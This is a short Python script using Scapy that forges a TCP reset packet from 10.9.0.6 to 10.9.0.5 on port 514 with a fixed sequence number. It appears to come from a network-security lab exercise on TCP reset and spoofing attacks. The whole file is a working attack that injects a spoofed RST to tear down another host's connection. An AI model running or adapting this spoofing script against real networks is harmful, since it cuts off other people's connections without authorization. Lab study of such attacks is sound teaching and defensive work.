#!usr/bin/python3
from scapy.all import *
import sys

print("Sending Spoofed RST Packet ...")
IPLayer = IP(src="10.9.0.6", dst="10.9.0.5")
TCPLayer = TCP(sport=1023,dport=514,flags="R", seq=778933537)
pkt = IPLayer/TCPLayer
send(pkt,verbose=0)
